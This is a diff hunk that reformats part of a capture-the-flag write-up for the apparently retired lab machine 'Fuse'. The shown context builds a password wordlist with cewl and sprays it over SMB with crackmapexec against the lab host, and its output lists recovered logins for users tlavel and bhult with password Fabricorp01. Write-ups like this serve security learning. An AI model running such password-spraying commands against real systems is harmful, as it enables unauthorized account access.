@@ -94,8 +94,8 @@ I had a handful of user names from the these printer logs. The logs are also pot
 I created a wordlist from the webpage using cewl: </br>
 ```cewl http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers > wordlist``` </br>
 
-```crackmapexec smb 10.10.10.193 -u users -p wordlist --continue-on-success``` </br>
-Results:
+```crackmapexec smb 10.10.10.193 -u users -p wordlist --continue-on-success``` </br> </br>
+**Results:**
 ```bash
 [445][smb] host: 10.10.10.193   login: tlavel   password: Fabricorp01
 [445][smb] host: 10.10.10.193   login: bhult   password: Fabricorp01
